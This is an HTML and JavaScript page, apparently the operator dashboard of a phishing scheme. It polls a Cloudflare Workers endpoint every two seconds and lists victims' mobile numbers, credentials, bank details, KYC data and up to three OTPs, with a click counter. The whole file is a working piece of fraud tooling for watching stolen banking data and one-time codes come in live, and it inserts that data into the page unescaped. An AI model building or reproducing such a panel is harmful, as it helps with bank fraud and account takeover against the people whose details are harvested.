<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin - Live Tracking</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
        body { background-color: #fff; text-align: center; }

        header { 
            padding: 15px 20px; 
            border-bottom: 1px solid #eee; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            position: sticky;
            top: 0;
            background: #fff;
            z-index: 100;
        }

        .header-center { flex-grow: 1; text-align: center; padding-left: 60px; }
        h1 { font-size: 20px; font-weight: bold; color: #000; letter-spacing: 2px; }
        .sub-text { color: red; font-size: 9px; font-weight: bold; margin-top: 2px; }

        /* Updated: Black Background, Green Text, No Border */
        #click-count {
            font-family: 'Orbitron', sans-serif;
            font-size: 24px;
            color: #00FF00; /* Digital Green */
            font-weight: bold;
            background: #000; /* Pure Black Background */
            padding: 6px 14px;
            border: none; /* Border Removed */
            border-radius: 4px;
            min-width: 60px;
            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
        }

        #data-container { padding: 10px; max-width: 500px; margin: 0 auto; }

        .card {
            text-align: left;
            padding: 15px 5px;
            border-bottom: 1.5px solid #000; /* Solid Black Line */
            margin-bottom: 5px;
        }

        .data-text {
            font-size: 14px;
            color: #333;
            line-height: 1.6;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .time-stamp {
            font-size: 10px;
            color: #888;
            margin-top: 5px;
            display: block;
        }
    </style>
</head>
<body>

    <header>
        <div class="header-center">
            <h1>DATA</h1>
            <div class="sub-text">Show data here</div>
        </div>
        <div id="click-count">00</div>
    </header>

    <div id="data-container"></div>

    <script>
        // Aapka Worker URL
        const workerURL = 'https://cold-pine-96e7.sumankkuuyy.workers.dev/';

        async function fetchData() {
            try {
                const response = await fetch(workerURL);
                const data = await response.json();
                
                // Update Click Count
                const countElement = document.getElementById('click-count');
                countElement.innerText = data.length < 10 ? "0" + data.length : data.length;

                const container = document.getElementById('data-container');
                container.innerHTML = ''; 

                // Database se data lene ke liye (Latest data upar dikhega)
                data.forEach(entry => {
                    const card = document.createElement('div');
                    card.className = 'card';

                    let content = "";
                    // Aapke columns ke hisaab se condition
                    if (entry.mobile) content += `Mobile: ${entry.mobile}\n`;
                    if (entry.credentials) content += `${entry.credentials}\n`;
                    if (entry.bank_details) content += `${entry.bank_details}\n`;
                    if (entry.kyc_data) content += `${entry.kyc_data}\n`;
                    if (entry.otp_1) content += `OTP 1: ${entry.otp_1}\n`;
                    if (entry.otp_2) content += `OTP 2: ${entry.otp_2}\n`;
                    if (entry.otp_3) content += `OTP 3: ${entry.otp_3}`;

                    // Agar sab empty hai toh placeholder
                    if (!content) content = "No Data Received";

                    card.innerHTML = `
                        <div class="data-text">${content}</div>
                        <span class="time-stamp">${entry.time || 'No Time'}</span>
                    `;
                    container.appendChild(card);
                });
            } catch (err) {
                console.error("Error fetching data:", err);
            }
        }

        // Har 2 second mein data refresh karega
        setInterval(fetchData, 2000);
        // Pehli baar load hone par call
        fetchData();
    </script>

</body>
</html>
